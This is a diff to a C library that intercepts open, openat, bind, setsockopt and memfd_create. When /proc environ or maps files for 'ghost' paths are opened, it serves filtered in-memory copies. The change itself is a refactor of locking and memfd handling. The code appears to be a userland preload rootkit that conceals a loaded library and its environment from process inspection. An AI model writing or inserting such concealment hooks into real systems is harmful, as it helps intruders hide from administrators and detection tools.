@@ -47,7 +47,8 @@ static setsockopt_t real_setsockopt = NULL;
 static memfd_create_t real_memfd_create = NULL;
 
 static pthread_mutex_t ghost_fd_mutex = PTHREAD_MUTEX_INITIALIZER;
-static pthread_mutex_t filter_mutex = PTHREAD_MUTEX_INITIALIZER;
+static pthread_mutex_t environ_mutex = PTHREAD_MUTEX_INITIALIZER;
+static pthread_mutex_t maps_mutex = PTHREAD_MUTEX_INITIALIZER;
 
 static int init_libc_funcs(void) {
     real_bind = (bind_t)dlsym(RTLD_NEXT, "bind");
@@ -93,8 +94,8 @@ static int create_filtered_memfd(const char *content, size_t len) {
     return fd;
 }
 
-static char *filter_environ(const char *path) {
-    pthread_mutex_lock(&filter_mutex);
+static int filter_environ_create_fd(const char *path) {
+    pthread_mutex_lock(&environ_mutex);
     
     static char *filtered = NULL;
     static size_t filtered_size = 65536;
@@ -102,8 +103,8 @@ static char *filter_environ(const char *path) {
     if (!filtered) {
         filtered = calloc(1, filtered_size);
         if (!filtered) {
-            pthread_mutex_unlock(&filter_mutex);
-            return NULL;
+            pthread_mutex_unlock(&environ_mutex);
+            return -1;
         }
     }
     
@@ -113,8 +114,8 @@ static char *filter_environ(const char *path) {
     
     int fd = real_open(path, O_RDONLY);
     if (fd < 0) {
-        pthread_mutex_unlock(&filter_mutex);
-        return NULL;
+        pthread_mutex_unlock(&environ_mutex);
+        return -1;
     }
     
     char buffer[4096];
@@ -138,12 +139,17 @@ static char *filter_environ(const char *path) {
     }
     real_close(fd);
     
-    pthread_mutex_unlock(&filter_mutex);
-    return filtered;
+    int result_fd = -1;
+    if (total > 0) {
+        result_fd = create_filtered_memfd(filtered, total);
+    }
+    
+    pthread_mutex_unlock(&environ_mutex);
+    return result_fd;
 }
 
-static char *filter_maps(const char *path) {
-    pthread_mutex_lock(&filter_mutex);
+static int filter_maps_create_fd(const char *path) {
+    pthread_mutex_lock(&maps_mutex);
     
     static char *filtered = NULL;
     static size_t filtered_size = 262144;
@@ -151,8 +157,8 @@ static char *filter_maps(const char *path) {
     if (!filtered) {
         filtered = calloc(1, filtered_size);
         if (!filtered) {
-            pthread_mutex_unlock(&filter_mutex);
-            return NULL;
+            pthread_mutex_unlock(&maps_mutex);
+            return -1;
         }
     }
     
@@ -162,8 +168,8 @@ static char *filter_maps(const char *path) {
     
     int fd = real_open(path, O_RDONLY);
     if (fd < 0) {
-        pthread_mutex_unlock(&filter_mutex);
-        return NULL;
+        pthread_mutex_unlock(&maps_mutex);
+        return -1;
     }
     
     char buffer[4096];
@@ -189,8 +195,13 @@ static char *filter_maps(const char *path) {
     }
     real_close(fd);
     
-    pthread_mutex_unlock(&filter_mutex);
-    return filtered;
+    int result_fd = -1;
+    if (total > 0) {
+        result_fd = create_filtered_memfd(filtered, total);
+    }
+    
+    pthread_mutex_unlock(&maps_mutex);
+    return result_fd;
 }
 
 int open(const char *path, int flags, ...) {
@@ -206,21 +217,15 @@ int open(const char *path, int flags, ...) {
     
     if (is_ghost_path(path)) {
         if (strstr(path, "environ") != NULL) {
-            char *filtered = filter_environ(path);
-            if (filtered && *filtered) {
-                int memfd = create_filtered_memfd(filtered, strlen(filtered));
-                if (memfd >= 0) {
-                    return memfd;
-                }
+            int memfd = filter_environ_create_fd(path);
+            if (memfd >= 0) {
+                return memfd;
             }
         }
         else if (strstr(path, "maps") != NULL) {
-            char *filtered = filter_maps(path);
-            if (filtered && *filtered) {
-                int memfd = create_filtered_memfd(filtered, strlen(filtered));
-                if (memfd >= 0) {
-                    return memfd;
-                }
+            int memfd = filter_maps_create_fd(path);
+            if (memfd >= 0) {
+                return memfd;
             }
         }
     }
@@ -243,21 +248,15 @@ int openat(int dirfd, const char *path, int flags, ...) {
     
     if (is_ghost_path(path)) {
         if (strstr(path, "environ") != NULL) {
-            char *filtered = filter_environ(path);
-            if (filtered && *filtered) {
-                int memfd = create_filtered_memfd(filtered, strlen(filtered));
-                if (memfd >= 0) {
-                    return memfd;
-                }
+            int memfd = filter_environ_create_fd(path);
+            if (memfd >= 0) {
+                return memfd;
             }
         }
         else if (strstr(path, "maps") != NULL) {
-            char *filtered = filter_maps(path);
-            if (filtered && *filtered) {
-                int memfd = create_filtered_memfd(filtered, strlen(filtered));
-                if (memfd >= 0) {
-                    return memfd;
-                }
+            int memfd = filter_maps_create_fd(path);
+            if (memfd >= 0) {
+                return memfd;
             }
         }
     }
